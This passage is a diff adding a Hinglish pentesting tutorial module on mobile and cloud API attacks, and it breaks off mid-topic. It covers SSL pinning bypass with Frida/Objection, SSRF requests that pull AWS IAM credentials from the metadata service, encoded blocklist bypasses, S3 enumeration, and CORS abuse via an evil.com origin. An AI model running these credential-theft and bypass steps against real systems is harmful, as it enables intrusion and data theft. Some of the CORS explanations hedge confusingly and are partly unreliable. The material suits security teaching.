@@ -5336,3 +5336,706 @@ Attacker -> Request with X-Forwarded-Host: evil.com -> Server generates response
 ---
 
 ========================================================================================
+
+## 🌐 Module 7: Infrastructure & Misconfiguration (Mobile & Cloud)
+
+Yeh module mobile applications (Android/iOS) mein API interception, cloud environments (AWS/Azure/GCP) ki common vulnerabilities, aur infrastructure-level misconfigurations (CORS, caching, headers) ke baare mein hai. Yahan hum seekhenge ki mobile app mein SSL pinning ko kaise bypass karein, cloud metadata se sensitive keys kaise churaayein, CORS misconfig se user data kaise leak karein, aur cache poisoning se malicious content kaise serve karwayein. Chaliye har topic ko detail mein samajhte hain.
+
+---
+
+### 🎯 Topic 7.1: Mobile API Interception (SSL Pinning Bypass)
+
+#### 1. 🎯 Title
+**Mobile API Interception (SSL Pinning Bypass)**
+
+#### 2. 🐣 Samjhane ke liye (Analogy)
+Sochiye aap kisi ke ghar mein chhup ke baat sunna chahte ho. Ghar ke darwaaze par ek special lock hai jo sirf ghar waalon ki chaabi se khulta hai (SSL pinning). Aap apni chaabi (Burp certificate) se lock nahi khol sakte. Ab aap ek "master key" banate ho jo lock ki andaruni mechanism ko hi disable kar deta hai—jaise Frida/Objection se pinning function ko hi hatana. Phir aap apni chaabi se lock khol kar andar ki baatein sun sakte ho (traffic intercept).
+
+#### 3. 📖 Technical Definition
+SSL pinning ek security mechanism hai jisme mobile app sirf specific SSL/TLS certificates ya public keys ko trust karti hai, na ki system ke certificate store par bharosa karti hai. Isse man-in-the-middle (MITM) attacks mushkil ho jaate hain, kyunki proxy tools (Burp, ZAP) ke certificates app reject kar deti hai. SSL pinning bypass ka matlab hai app ke code mein changes kiye bina, runtime pe pinning logic ko disable karna, taaki hum proxy certificate se traffic intercept kar saken.
+
+#### 4. 🧠 Zaroorat Kyun Hai?
+Mobile app pentesting ke dauran humein API requests/responses dekhne hote hain. Agar SSL pinning enabled hai, toh humara proxy ka certificate kaam nahi karega. Isliye pinning bypass karna zaroori hai taaki hum app ke traffic ko intercept kar ke vulnerabilities (IDOR, injections, etc.) identify kar saken.
+
+#### 5. 🔍 Visual - Screen Par Kya Dikhega
+- Normal scenario: Burp proxy set karne ke baad app open karte hi error aata hai: "Network error", "SSL handshake failed", ya blank screen. Kuch apps to open hi nahi hoti.
+- Bypass ke baad: App normal chal rahi hai, aur Burp mein saari requests dikh rahi hain (jaise `POST /api/login`, `GET /api/profile` etc.)
+
+#### 6. ⚙️ Under the Hood
+SSL pinning typically implement hota hai:
+- **Android:** Network security config (XML) ya code mein `TrustManager`/`OkHttp` ke through.
+- **iOS:** `URLSession` ke `delegate` methods mein certificate validation.
+
+Frida ek dynamic instrumentation tool hai jo running process mein JavaScript inject karta hai. Objection Frida par based runtime mobile exploration tool hai. `android sslpinning disable` command Frida scripts use karti hai jo common pinning implementations ko hook kar ke bypass kar deti hai (jaise `checkServerTrusted` method ko override karna).
+
+#### 7. 💻 Hands-On Step-by-Step
+**Prerequisites:**
+- Android/iOS device/emulator with USB debugging enabled.
+- Frida installed on PC: `pip install frida-tools`
+- Objection installed: `pip install objection`
+- Burp Suite with proxy set on same network.
+
+**Step 1 (Android):**
+- Connect device: `adb devices` se list ho.
+- App package name pata karo: `frida-ps -U` ya `adb shell pm list packages | grep <app_name>`.
+- Start objection for the app:
+  ```
+  objection --gadget "com.example.app" explore
+  ```
+- Objection console open hoga. Wahan command run karo:
+  ```
+  android sslpinning disable
+  ```
+- Alternatively, agar app already running hai toh objection attach kar sakte ho:
+  ```
+  objection -g com.example.app explore
+  ```
+
+**Step 2 (iOS):**
+- Jailbroken device ya FridaGadget injected IPA.
+- Objection se attach:
+  ```
+  objection -g "AppName" explore
+  ```
+- Command:
+  ```
+  ios sslpinning disable
+  ```
+
+**Step 3:** Ab app mein koi action perform karo (login, etc.). Burp mein requests aane lagenge.
+
+**Step 4 (Alternative method without Frida):**
+- Android emulator mein proxy set karo (WiFi settings → Manual proxy → Burp IP).
+- Install ProxyDroid app, usme proxy configure karo (Burp IP, port).
+- ProxyDroid mein "Global Proxy" enable karo. Isse saara traffic Burp se hokar jayega, lekin SSL pinning bypass nahi hoga; agar app pinning karti hai toh bhi error aayega. ProxyDroid sirf system-wide proxy provide karta hai, pinning bypass nahi. Isliye Frida/Objection better hai.
+
+**Hardcoded Keys Dhundhna:**
+- APK file decompile karo:
+  ```
+  apktool d app.apk
+  ```
+- `res/values/strings.xml` mein API keys, Firebase URLs dhoondo.
+- Source code (smali) mein bhi grep karo: `grep -r "api_key" .` ya `grep -r "https://" .`
+
+#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** Burp mein app ke saare HTTPS requests dikh rahe hain, koi SSL error nahi.
+- **Failure:** App still shows network error, ya Burp mein kuch nahi aata.
+
+#### 9. ⚖️ Comparison (SSL Pinning vs Certificate Pinning)
+| SSL Pinning | Certificate Pinning (Strict) |
+|-------------|------------------------------|
+| Usually refers to pinning the server's certificate or public key | Same concept, but sometimes pinning the exact certificate, not just public key |
+| Can be bypassed by hooking validation methods | Harder to bypass if public key pinning, but still possible with Frida |
+
+#### 10. 🚫 Common Mistakes
+- **Mistake:** Objection command fail ho rahi hai kyunki app debuggable nahi hai. **Fix:** Android ke liye, app ko repack karke android:debuggable=true set karo, ya rooted device use karo.
+- **Mistake:** Burp certificate install karna bhoolna. **Fix:** Burp CA certificate device mein install karo (Settings → Security → Install from SD card).
+- **Mistake:** iOS par non-jailbroken device mein objection use karna. **Fix:** Jailbreak ya FridaGadget injected IPA bana lo.
+
+#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+- **Q:** Kya SSL pinning bypass ke baad app detect kar legi ki modified hai?
+  **A:** App runtime detection kar sakti hai (root detection, Frida detection). Uske liye additional bypass techniques chahiye (objection ke `android root disable` etc.).
+- **Q:** Kya yeh sab legal hai?
+  **A:** Apne app ke pentest ke liye allowed hai. Bina permission kisi aur ka app break karna illegal hai.
+
+#### 12. 🌍 Real-World Use Case
+**Bug Bounty Example:** Ek banking app mein SSL pinning thi. Hacker ne Frida script likh kar pinning bypass kiya, phir traffic dekha to ek endpoint `GET /api/transactions` par user ID parameter tha jo change karke doosre users ka transaction history leak ho raha tha (IDOR). Yeh vulnerability critical thi kyunki bina bypass ke pata nahi chal paata.
+
+#### 13. 🎨 Visual Diagram (ASCII Art)
+```
+Mobile App (with pinning) --> Frida/Objection (hooks validation) --> Burp Proxy --> Server
+```
+
+#### 14. 🛠️ Best Practices (Pro Tips)
+- **Pro Tip 1:** Frida script se pinning bypass ke alawa certificate pinning log ko dump bhi kar sakte ho.
+- **Pro Tip 2:** Agar objection ka `android sslpinning disable` kaam nahi kar raha, toh custom Frida script use karo jo specific library (OkHttp, HttpURLConnection) target kare.
+- **Pro Tip 3:** Hardcoded keys dhundhne ke liye `apktool` ke baad `grep -rE "api[_-]?key|secret|token|firebase"` karo.
+
+#### 15. ❓ FAQ (Interview Questions)
+- **Q1:** SSL pinning ka purpose kya hai?
+  **A:** MITM attacks se bachna, even if device mein rogue CA installed ho.
+- **Q2:** Frida kaise kaam karta hai?
+  **A:** Frida target process mein JavaScript engine inject karta hai aur uski memory mein functions ko hook kar leta hai.
+- **Q3:** SSL pinning bypass ke alternate tareeke?
+  **A:** App repack karke pinning code remove karna, ya patching binary (iOS), ya object file modification.
+
+#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+**"Pinning laga ho to Frida laga, objection se bypass kar, Burp mein traffic dekh."**
+
+---
+
+### 🎯 Topic 7.2: Cloud-Native API Risks (AWS/Azure/GCP)
+
+#### 1. 🎯 Title
+**Cloud-Native API Risks (Metadata SSRF, S3 Leakage, Serverless Risks)**
+
+#### 2. 🐣 Samjhane ke liye (Analogy)
+Sochiye aapke ghar ka safe (cloud server) hai. Uski ek secret diary hai jisme saari passwords likhi hain—yeh diary sirf ghar ke andar se padhi ja sakti hai (metadata service). Agar koi chor (attacker) aapke ghar mein ghus kar koi cheez (SSRF) aapki diary tak pahuncha de, toh wo passwords padh lega. Yahi metadata SSRF hai. Ab maan lo aapne apni almirah (S3 bucket) khuli chhod di, to koi bhi andar ka samaan dekh sakta hai. Aur serverless lambda? Wo aapke robot ki tarah kaam karta hai, lekin agar robot ko galat instructions (event injection) de do to wo kuch bhi kar dega.
+
+#### 3. 📖 Technical Definition
+- **Metadata SSRF:** Cloud providers (AWS, Azure, GCP) instance ke andar ek internal metadata service hoti hai (169.254.169.254) jo instance ke baare mein sensitive info deti hai (IAM roles, credentials). SSRF vulnerability ke through attacker is internal endpoint ko hit kar ke temporary AWS keys le sakta hai.
+- **S3 Bucket Leakage:** Agar API response mein S3 URLs expose ho rahe hain (jaise image URLs), aur bucket misconfigured hai (public read), toh attacker sensitive files download kar sakta hai.
+- **Serverless (Lambda) Risks:** Lambda functions event-based hote hain. Agar input validation na ho, toh attacker crafted JSON event bhej kar function ke behavior ko change kar sakta hai (event injection), jaise database query modify karna.
+
+#### 4. 🧠 Zaroorat Kyun Hai?
+Cloud misconfigurations se bada data leak ho sakta hai. Metadata SSRF se attacker cloud environment compromise kar sakta hai. S3 leaks se sensitive user data public ho jata hai. Lambda risks se business logic bypass ho sakta hai.
+
+#### 5. 🔍 Visual - Screen Par Kya Dikhega
+**Metadata SSRF:**
+- Koi endpoint jo external URL fetch karta ho (e.g., `GET /fetch?url=http://example.com`).
+- SSRF test: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+- Response mein agar IAM role name aur keys aa jayein, toh vulnerable.
+
+**S3 Leakage:**
+- API response mein kuch aisa dikhe: `"profile_pic": "https://s3.amazonaws.com/company-users-bucket/123.jpg"`
+- Agar bucket public hai, toh directly URL open kar ke image dekh sakte hain. Aur directory listing? Try `https://s3.amazonaws.com/company-users-bucket/` — agar listing aayi toh aur files milengi.
+
+**Serverless:**
+- Lambda function ke URL par POST request bhej kar data modify karna. Jaise event mein extra fields daalna.
+
+#### 6. ⚙️ Under the Hood
+**Metadata SSRF:**
+AWS EC2 instance par metadata service IP `169.254.169.254` hota hai. Role credentials ka path `/latest/meta-data/iam/security-credentials/<role-name>/` hota hai. `169.254.169.254` ke alawa AWS ke paas `169.254.169.253` (DNS) bhi hota hai.
+
+**S3 Bucket:**
+S3 bucket URLs format: `https://<bucket-name>.s3.amazonaws.com/` ya `https://s3.amazonaws.com/<bucket-name>/`. Agar bucket ACL public-read hai toh koi bhi list/read kar sakta hai.
+
+**Serverless:**
+Lambda functions triggered by events (API Gateway, S3, etc.). Agar function mein event object parse karte waqt validation nahi hai, toh attacker malicious fields inject kar ke logic affect kar sakta hai.
+
+#### 7. 💻 Hands-On Step-by-Step
+**Metadata SSRF:**
+
+**Step 1:** Koi aisa endpoint dhoondo jo URL parameter leta ho (image fetch, webhook, etc.). Jaise:
+```
+GET /api/avatar?url=https://example.com/image.jpg
+```
+**Step 2:** Burp Repeater mein URL change karo internal IP:
+```
+GET /api/avatar?url=http://169.254.169.254/latest/meta-data/
+```
+Response mein kuch aaye jaise `ami-id`, `instance-id`, etc.
+
+**Step 3:** Phir IAM credentials dhundho:
+```
+GET /api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+Response mein role name milega (e.g., `my-role`).
+
+**Step 4:** Us role ke credentials le lo:
+```
+GET /api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role
+```
+Response JSON format mein temporary AWS keys (AccessKeyId, SecretAccessKey, Token) milega.
+
+**S3 Leakage:**
+
+**Step 1:** API response mein koi S3 URL dhundo.
+
+**Step 2:** Us URL ko browser mein open karo. Agar file download ho jaye, toh bucket public hai.
+
+**Step 3:** Directory listing check karo: remove filename, only bucket path. Jaise `https://s3.amazonaws.com/company-users-bucket/` — agar XML listing aayi, toh aur files milengi.
+
+**Step 4:** Listing na bhi ho, to common file names brute-force kar sakte ho.
+
+**Serverless Event Injection:**
+
+**Step 1:** Lambda function endpoint ko identify karo (e.g., `POST /api/order`).
+
+**Step 2:** Normal request bhejo:
+```
+{"item":"laptop", "quantity":1}
+```
+**Step 3:** Extra fields inject karo, jaise `"admin":true`, `"price":0`. Dekho response mein kya farak padta hai.
+
+#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Metadata SSRF Success:** IAM credentials mil gaye.
+- **Metadata SSRF Failure:** Error "Connection refused" ya "Invalid URL".
+- **S3 Leakage Success:** File download ya directory listing visible.
+- **S3 Leakage Failure:** `403 AccessDenied`.
+- **Serverless Success:** Function ne unexpected behavior dikhaya (e.g., admin action perform kar diya).
+
+#### 9. ⚖️ Comparison (Metadata SSRF vs S3 Leakage)
+| Metadata SSRF | S3 Leakage |
+|---------------|------------|
+| Cloud instance ke andar ka data | Public cloud storage |
+| Credentials churaana | Files churaana |
+| Requires SSRF vulnerability | Requires misconfigured bucket |
+
+#### 10. 🚫 Common Mistakes
+- **Mistake:** Sirf `169.254.169.254` try karna, lekin cloud providers ke paas doosre IP bhi hote hain (e.g., GCP metadata `169.254.169.254` same; Azure `169.254.169.254` also works). Lekin Azure ke paas alag endpoint bhi hai: `168.63.129.16`.
+- **Mistake:** IAM credentials expire ho jaate hain, lekin attacker use kar sakta hai immediate attacks.
+- **Mistake:** S3 bucket listing band ho, lekin file names guess kiye ja sakte hain (e.g., user IDs). Isliye file enumeration bhi try karo.
+
+#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+- **Q:** SSRF se metadata hit karne ke liye request external ho ya internal? Server side request hogi, to internal IP accessible hoga.
+- **Q:** Kya metadata service sabhi cloud providers mein same IP hai?
+  **A:** AWS, GCP, Azure (most) use `169.254.169.254`. Azure ke paas alag IP bhi hai.
+- **Q:** Agar bucket public hai toh kya koi bhi file dekh sakta hai?
+  **A:** Ha agar object ACL public hai. Directory listing bucket ki setting par depend karta hai.
+
+#### 12. 🌍 Real-World Use Case
+**Capital One Breach (2019):** Attacker ne SSRF vulnerability exploit kiya EC2 metadata se IAM credentials le liye, phir S3 buckets se 100 million+ customer records leak kar diye. Yeh cloud misconfig ka sabse bada example hai.
+
+#### 13. 🎨 Visual Diagram (ASCII Art)
+```
+Attacker -> SSRF in app -> request to 169.254.169.254 -> metadata service -> IAM keys -> Attacker uses keys to access S3
+```
+
+#### 14. 🛠️ Best Practices (Pro Tips)
+- **Pro Tip 1:** Metadata SSRF ke liye blocklist bypass karo: `http://[::169.254.169.254]`, `http://0xA9.0xFE.0xA9.0xFE`, ya `http://169.254.169.254.nip.io/`.
+- **Pro Tip 2:** S3 bucket dhundhne ke liye tools like `awscli` use karo, ya `bucketkicker` se brute-force.
+- **Pro Tip 3:** Serverless event injection ke liye fuzz karo common fields jaisa `user`, `role`, `admin`, `isAdmin`.
+
+#### 15. ❓ FAQ (Interview Questions)
+- **Q1:** AWS metadata service ka IP kya hai?
+  **A:** 169.254.169.254
+- **Q2:** SSRF se AWS keys milne ke baad attacker kya kar sakta hai?
+  **A:** Instance impersonate kar ke S3 read, EC2 start/stop, etc.
+- **Q3:** S3 bucket ko secure kaise rakhein?
+  **A:** Public access block karo, bucket policy restrict karo, aur IAM roles se access control.
+
+#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+**"Metadata SSRF se keys chura, S3 bucket se data utha, serverless me event inject—cloud ki chhutti kar de."**
+
+---
+
+### 🎯 Topic 7.3: CORS (Cross-Origin Resource Sharing) Misconfiguration
+
+#### 1. 🎯 Title
+**CORS Misconfiguration**
+
+#### 2. 🐣 Samjhane ke liye (Analogy)
+Maan lo aapka ek ghar hai (website) jisme aapne apne dost (trusted origins) ko andar aane ki permission di hai. CORS policy wahi hai—yeh batati hai ki kaunsi websites aapke API se data le sakti hain. Agar aapne "kisi ko bhi aa sakta hai" policy (wildcard `*`) laga di aur saath mein "credentials bhi de do" (cookies) bol diya, toh koi bhi hacker ki website aapke user ka data chura sakti hai. Yahi CORS misconfiguration hai.
+
+#### 3. 📖 Technical Definition
+CORS ek HTTP header-based mechanism hai jo browser ko batata hai ki kisi different origin (domain, scheme, port) se request karne ki permission hai ya nahi. Main headers: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`. Misconfiguration tab hoti hai jab:
+- `Access-Control-Allow-Origin: *` ke saath `Access-Control-Allow-Credentials: true` ho (yeh insecure hai, browser allow nahi karta actually? Specification kehta hai ki `*` ke saath credentials true nahi ho sakta, lekin servers galat implement kar sakte hain).
+- Origin reflect ho (server jo origin request mein bheja wahi allow kar de).
+- `null` origin allow karna.
+
+#### 4. 🧠 Zaroorat Kyun Hai?
+CORS misconfiguration se attacker malicious website bana kar user ka data (API responses) chura sakta hai jab user us site par aaye. Ye CSRF-type attack hai, lekin cross-origin read karna.
+
+#### 5. 🔍 Visual - Screen Par Kya Dikhega
+- Request mein `Origin: https://evil.com` header daalo.
+- Response check karo:
+  ```
+  Access-Control-Allow-Origin: https://evil.com
+  Access-Control-Allow-Credentials: true
+  ```
+- Agar aisa ho toh vulnerable.
+
+#### 6. ⚙️ Under the Hood
+Browser jab kisi different origin se request karta hai, toh preflight OPTIONS request bhejta hai (complex requests me) ya direct request me `Origin` header dalta hai. Server `Access-Control-Allow-Origin` response header me allow kare to browser response ko JavaScript ko deta hai. Agar credentials true hai aur allow-origin specific hai, toh cookies bhi bheji ja sakti hai. Agar allow-origin `*` hai aur credentials true hai toh technically browser error dega, lekin agar server aisa response de, toh browser allow kar lega? Actually spec prohibits `*` with credentials, but some browsers may ignore? Better to test.
+
+#### 7. 💻 Hands-On Step-by-Step
+**Test for Wildcard + Credentials:**
+
+**Step 1:** Target API endpoint select karo (e.g., `GET /api/user/profile`).
+
+**Step 2:** Burp Repeater mein request bhejo with `Origin: https://evil.com` header.
+
+**Step 3:** Response headers check karo. Agar:
+```
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+Aisa combination vulnerable hai (critical).
+
+**Test for Origin Reflection:**
+
+**Step 1:** Request bhejo with `Origin: https://evil.com`.
+
+**Step 2:** Agar response mein `Access-Control-Allow-Origin: https://evil.com` milta hai, toh server origin reflect kar raha hai.
+
+**Step 3:** Ab check karo `Access-Control-Allow-Credentials: true` hai ya nahi. Agar hai, toh malicious site user data chura sakti hai.
+
+**Test for Null Origin:**
+
+**Step 1:** Request bhejo with `Origin: null` (ya to sandboxed iframe se).
+
+**Step 2:** Agar response mein `Access-Control-Allow-Origin: null` aur credentials true ho, toh vulnerable.
+
+#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** Headers as above present hain.
+- **Failure:** Origin header reflect nahi hua, ya `Access-Control-Allow-Origin` missing, ya credentials false.
+
+#### 9. ⚖️ Comparison (CORS vs CSRF)
+| CORS Misconfiguration | CSRF |
+|-----------------------|------|
+| Cross-origin read capability | Cross-origin write (state change) |
+| Depends on response headers | Depends on lack of anti-CSRF tokens |
+| Attacker reads user data | Attacker performs action on behalf of user |
+
+#### 10. 🚫 Common Mistakes
+- **Mistake:** Sirf wildcard check karna. **Fix:** Origin reflection bhi check karo.
+- **Mistake:** Credentials true hone par bhi agar `*` hai toh browser allow nahi karega? But servers galat ho sakte hain, aur browser policy strict nahi bhi ho. Isliye test karo.
+- **Mistake:** Preflight OPTIONS request ko ignore karna. **Fix:** OPTIONS ka bhi response check karo.
+
+#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+- **Q:** Kya CORS misconfiguration ka exploit karne ke liye user interaction chahiye?
+  **A:** Ha, user ko malicious website par aana hoga aur authenticated hona hoga target site par.
+- **Q:** Kya CORS sirf JavaScript se data read karne ke liye relevant hai?
+  **A:** Ha, normal browser requests (image, form) CORS se restrict nahi hote, lekin response JavaScript ko nahi milta. CORS ka goal hai controlled access.
+- **Q:** Kya `*` ke saath credentials true possible hai?
+  **A:** Spec kehti hai nahi, lekin kuch servers aisa response de sakte hain, aur browser allow kar dega? Actually browsers probably enforce spec, but vulnerable servers may have other misconfigurations like dynamic origin reflection.
+
+#### 12. 🌍 Real-World Use Case
+**Bug Bounty Example:** Facebook me ek CORS misconfiguration thi jisse `null` origin allow tha aur credentials true the. Attacker iframe sandbox se user data read kar sakta tha. Facebook ne fix kiya.
+
+#### 13. 🎨 Visual Diagram (ASCII Art)
+```
+User logs into bank.com -> visits evil.com -> evil.com JavaScript makes request to bank.com/api with Origin: evil.com -> bank.com reflects origin and sends credentials -> browser gives response to evil.com -> attacker gets user data.
+```
+
+#### 14. 🛠️ Best Practices (Pro Tips)
+- **Pro Tip 1:** CORS test ke liye Burp extension "CORS Scanner" use kar sakte ho.
+- **Pro Tip 2:** Manual testing mein `Origin` header ko rotate karo: random domains, `null`, subdomains, etc.
+- **Pro Tip 3:** Agar credentials true nahi hai, toh bhi sensitive data (non-authenticated) leak ho sakta hai.
+
+#### 15. ❓ FAQ (Interview Questions)
+- **Q1:** CORS policy ka objective kya hai?
+  **A:** Same-origin policy ko relax karte hue controlled cross-origin access dena.
+- **Q2:** `Access-Control-Allow-Origin: *` kab safe hai?
+  **A:** Jab API public ho aur credentials ki zaroorat nahi (no cookies).
+- **Q3:** CORS misconfiguration se kya attack possible hai?
+  **A:** Data theft via malicious website.
+
+#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+**"CORS ka chakkar, origin reflect kare to data leak ka darr."**
+
+---
+
+### 🎯 Topic 7.4: API Versioning & Deprecation
+
+#### 1. 🎯 Title
+**API Versioning & Deprecation**
+
+#### 2. 🐣 Samjhane ke liye (Analogy)
+Sochiye aapke ghar mein purana TV (v1) aur naya TV (v2) hai. Purane TV mein kuch defects hain (vulnerabilities). Aap ne naya TV le liya aur purane ko store room mein daal diya, lekin darwaaza band nahi kiya. Koi chor andar aa kar purane TV se defects exploit kar sakta hai. Yahi deprecated API version ka risk hai. Aur agar aapne TV ke debugging buttons (debug endpoints) khule chhod diye hain, toh koi bhi aake settings kharab kar sakta hai.
+
+#### 3. 📖 Technical Definition
+- **Debug Endpoints:** Endpoints jo sirf development ke liye hone chahiye, jaise `/api/debug`, `/api/test`, `/api/health`, `/api/status`. Agar ye production mein available hain, toh sensitive information leak ho sakti hai (server status, config, etc.).
+- **Deprecated Versions:** Jab API version upgrade hota hai, to purane versions (`/v1/`) ko band karna chahiye. Agar band nahi kiya, to unme purani vulnerabilities (jo naye version mein fix hui hain) abhi bhi exploit ki ja sakti hain.
+
+#### 4. 🧠 Zaroorat Kyun Hai?
+Deprecated versions mein unpatched vulnerabilities hoti hain. Attackers unhe target kar sakte hain. Debug endpoints se information disclosure ho sakta hai jo further attacks mein help karta hai.
+
+#### 5. 🔍 Visual - Screen Par Kya Dikhega
+- Debug endpoint hit karo: `GET /api/debug` → response mein stack trace, environment variables, etc.
+- Deprecated version try karo: `GET /v1/users` instead of `GET /v2/users`. Agar response same data de raha hai, toh deprecated version accessible hai. Check karo ki `v1` mein vulnerabilities hain (jaane ke liye).
+
+#### 6. ⚙️ Under the Hood
+- **Debug endpoints:** Developers frameworks ke debug mode ko enable kar sakte hain, jo extra info expose karta hai.
+- **Versioning:** Common patterns: `/api/v1/resource`, `/api/v2/resource`. Agar server versioning ko route level handle karta hai, toh purane versions ka code still deployed ho sakta hai.
+
+#### 7. 💻 Hands-On Step-by-Step
+**Debug Endpoints Enumeration:**
+
+**Step 1:** Common debug paths ki list bana lo:
+```
+/api/debug
+/api/test
+/api/health
+/api/status
+/api/metrics
+/api/console
+/.env
+```
+
+**Step 2:** Burp Intruder mein in paths ko fuzz karo.
+
+**Step 3:** Response dekho. Agar `200 OK` aur kuch info dikhi, toh vulnerable.
+
+**Deprecated Versions:**
+
+**Step 1:** Current version pata karo (e.g., `/api/v3/users`).
+
+**Step 2:** Version number kam karte jao: `/api/v2/users`, `/api/v1/users`, `/api/v0/users`.
+
+**Step 3:** Har version ke response compare karo. Agar same data mil raha hai (ya kuch data mil raha hai) toh version active hai.
+
+**Step 4:** Known vulnerabilities (jaise v1 mein IDOR thi) test karo.
+
+#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Debug Endpoint Success:** Response mein sensitive info (server version, paths, etc.) dikhe.
+- **Failure:** `404 Not Found`.
+- **Deprecated Version Success:** `200 OK` with data.
+- **Failure:** `404` ya `410 Gone`.
+
+#### 9. ⚖️ Comparison (Debug vs Deprecated)
+| Debug Endpoints | Deprecated Versions |
+|-----------------|---------------------|
+| Unnecessary exposure | Old code exposure |
+| Usually informational | May have known vulnerabilities |
+
+#### 10. 🚫 Common Mistakes
+- **Mistake:** Sirf `/v1/` try karna. **Fix:** `/api/v1/`, `/api/1/`, `/v1/api/`, `/1/` sab try karo.
+- **Mistake:** Debug endpoints me sirf `/debug` try karna. **Fix:** Fuzz common list.
+- **Mistake:** Versioning me patch version bhi try karo: `/v1.2/` etc.
+
+#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+- **Q:** Kya debug endpoints se direct exploit ho sakta hai?
+  **A:** Nahi, lekin info se doosre vulnerabilities ko target karna easy ho jata hai.
+- **Q:** Agar version 2 mein bhi vulnerability ho, toh version 1 mein bhi hogi?
+  **A:** Hamesha nahi, but ho sakti hai. Test karna padega.
+
+#### 12. 🌍 Real-World Use Case
+**Uber Bug Bounty:** Uber ke API mein ` /v1/debug ` endpoint tha jo stack trace leak kar raha tha, jisse internal paths pata chale. Isse help hui doosre bugs find karne mein.
+
+#### 13. 🎨 Visual Diagram (ASCII Art)
+```
+Attacker -> /v1/users (deprecated) -> Server (old code) -> Data/Error -> Vulnerability exploit possible
+```
+
+#### 14. 🛠️ Best Practices (Pro Tips)
+- **Pro Tip 1:** Debug endpoints ki comprehensive wordlist use karo: `seclists/Discovery/Web-Content/common-api-endpoints.txt`.
+- **Pro Tip 2:** Version bypass ke liye `Accept` header bhi change karo: `Accept: application/vnd.company.v1+json`.
+- **Pro Tip 3:** Deprecated versions ke saath saath staging environment endpoints bhi check karo (e.g., `staging-api.target.com`).
+
+#### 15. ❓ FAQ (Interview Questions)
+- **Q1:** API versioning ke common tareeke kya hain?
+  **A:** URI path (`/v1/`), subdomain (`v1.api.`), query parameter (`?version=1`), header (`Accept: version=1`).
+- **Q2:** Deprecated versions ko safely handle karne ka tarika?
+  **A:** Unko permanently disable karo, ya `410 Gone` response do, aur documentation mein remove karo.
+- **Q3:** Debug endpoints se kya leak ho sakta hai?
+  **A:** Server version, environment variables, internal IPs, stack traces, configuration details.
+
+#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+**"Debug khola, version purana—dono hi hacker ke liye sahara."**
+
+---
+
+### 🎯 Topic 7.5: Security Headers & Verbose Errors
+
+#### 1. 🎯 Title
+**Security Headers & Verbose Errors**
+
+#### 2. 🐣 Samjhane ke liye (Analogy)
+Jaise aap apne ghar ke darwaaze par tala lagate ho, aur khidki par grills lagate ho. Security headers woh grills hain—HSTS (Strict-Transport-Security) force karta hai ki sab log HTTPS se aaye, CSP (Content-Security-Policy) batata hai ki kaunsi scripts chale, X-Content-Type-Options prevent karta hai browser ko file type galat interpret karne se. Verbose errors matlab agar koi galat chaabi daale to aap poora lock ka mechanism bata do—ki "yeh gear galat hai, gearbox ka model yeh hai". Isse attacker ko helpful info mil jaati hai.
+
+#### 3. 📖 Technical Definition
+- **Security Headers:** HTTP response headers jo browser/client ko specific security behaviors enforce karne ke liye bheje jaate hain. Common:
+  - `Strict-Transport-Security` (HSTS): Browser ko force karta hai ki future requests sirf HTTPS par jayein.
+  - `Content-Security-Policy` (CSP): Controls resources (scripts, styles) kis source se load ho sakte hain.
+  - `X-Content-Type-Options: nosniff`: Browser ko MIME type sniffing se rokta hai.
+  - `X-Frame-Options`: Clickjacking se bachata hai.
+  - `Referrer-Policy`: Referrer header control.
+- **Verbose Error Messages:** Jab server galat input par detailed error de (stack trace, DB error, internal path, etc.), jo attacker ko system ki jaankari de.
+
+#### 4. 🧠 Zaroorat Kyun Hai?
+Security headers missing ho to client-side attacks (XSS, clickjacking, MITM) asaan ho jaate hain. Verbose errors se information disclosure hota hai, jo further attacks mein madadgar hai.
+
+#### 5. 🔍 Visual - Screen Par Kya Dikhega
+**Security Headers Check:**
+- Burp ya browser dev tools mein response headers dekho.
+- Agar headers missing hain toh note karo.
+
+**Verbose Errors:**
+- Malformed input bhejo: `GET /api/user?id=abc` (integer expected).
+- Response mein SQL error dikhe: `"error": "SQLite3::SQLException: no such column: abc"` ya stack trace with full path.
+
+#### 6. ⚙️ Under the Hood
+- HSTS: Browser jab ye header dekhta hai to site ko HSTS list mein daal kar future requests automatically HTTPS par bhejta hai.
+- CSP: Whitelist-based policy, e.g., `default-src 'self'` means only same origin.
+- X-Content-Type-Options: Agar server `Content-Type: text/plain` bheje aur file mein HTML ho, browser usse render nahi karega.
+- Verbose Errors: Development mode mein on hote hain, production mein off hone chahiye. Frameworks (Django, Rails) by default production mein error pages show nahi karte, but misconfigure ho sakte hain.
+
+#### 7. 💻 Hands-On Step-by-Step
+**Security Headers:**
+
+**Step 1:** Target site ka koi bhi endpoint request karo (e.g., homepage ya API).
+
+**Step 2:** Response headers note karo. Check karo:
+- `Strict-Transport-Security` present?
+- `Content-Security-Policy` present?
+- `X-Content-Type-Options: nosniff` present?
+- `X-Frame-Options: DENY` ya `SAMEORIGIN` present?
+- `Referrer-Policy` present?
+
+**Step 3:** Agar missing hain, to report karo ki "Security headers missing".
+
+**Verbose Errors:**
+
+**Step 1:** API endpoints par fuzzing karo with invalid data:
+- Change data type (string instead of int)
+- Add special characters (`'", <, >`)
+- Extra parameters
+- Negative values, long strings
+
+**Step 2:** Responses mein dekho:
+- SQL errors (MySQL, PostgreSQL, etc.)
+- Stack traces (file paths like `/var/www/html/...`)
+- Internal IP addresses
+- Framework version info
+
+**Step 3:** Collect saare information disclosure points.
+
+#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
